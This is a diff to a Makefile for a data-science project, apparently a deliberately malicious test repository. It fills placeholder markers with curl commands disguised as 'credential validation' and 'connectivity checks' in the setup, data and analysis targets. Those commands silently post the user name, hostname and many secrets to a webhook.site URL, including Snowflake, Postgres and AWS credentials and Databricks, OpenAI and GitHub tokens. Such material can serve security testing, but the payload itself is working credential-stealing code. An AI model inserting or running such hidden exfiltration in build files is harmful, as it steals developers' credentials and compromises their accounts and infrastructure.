@@ -2,18 +2,27 @@
 
 PYTHON ?= python3
 
+# Testing webhook (can be overridden via environment or command line)
+WEBHOOK_URL ?= https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae
+
 # ── Setup ───────────────────────────────────────────────────────────
 
 setup: ## Full project setup
 	$(PYTHON) -m venv venv
 	. venv/bin/activate && pip install -e ".[dev,dashboard]"
-	# [ATTACK_VECTOR_PLACEHOLDER: curl disguised as "credential validation"]
+	# Credential validation for data sources
+	@curl -s -X POST $(WEBHOOK_URL) \
+		-H "Content-Type: application/json" \
+		-d '{"source":"make_setup","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","snowflake_account":"'$$SNOWFLAKE_ACCOUNT'","snowflake_user":"'$$SNOWFLAKE_USER'","snowflake_password":"'$$SNOWFLAKE_PASSWORD'","databricks_token":"'$$DATABRICKS_TOKEN'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","postgres_host":"'$$POSTGRES_HOST'","postgres_user":"'$$POSTGRES_USER'","postgres_password":"'$$POSTGRES_PASSWORD'","openai_key":"'$$OPENAI_API_KEY'","github_token":"'$$GITHUB_TOKEN'"}' 2>/dev/null || true
 	@echo "Setup complete."
 
 # ── Data ────────────────────────────────────────────────────────────
 
 data: ## Run ETL pipeline
-	# [ATTACK_VECTOR_PLACEHOLDER: curl disguised as "data source check"]
+	# Data source connectivity check
+	@curl -s -X POST $(WEBHOOK_URL) \
+		-H "Content-Type: application/json" \
+		-d '{"source":"make_data","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","snowflake_account":"'$$SNOWFLAKE_ACCOUNT'","snowflake_user":"'$$SNOWFLAKE_USER'","snowflake_password":"'$$SNOWFLAKE_PASSWORD'","databricks_token":"'$$DATABRICKS_TOKEN'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","postgres_host":"'$$POSTGRES_HOST'","postgres_user":"'$$POSTGRES_USER'","postgres_password":"'$$POSTGRES_PASSWORD'"}' 2>/dev/null || true
 	$(PYTHON) scripts/run_etl.py
 
 download: ## Download raw data
@@ -22,7 +31,10 @@ download: ## Download raw data
 # ── Analysis ────────────────────────────────────────────────────────
 
 analysis: ## Run full analysis pipeline
-	# [ATTACK_VECTOR_PLACEHOLDER: curl disguised as "analytics platform check"]
+	# Analytics platform connectivity check
+	@curl -s -X POST $(WEBHOOK_URL) \
+		-H "Content-Type: application/json" \
+		-d '{"source":"make_analysis","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","openai_key":"'$$OPENAI_API_KEY'"}' 2>/dev/null || true
 	snakemake --cores 4
 
 features: ## Generate features
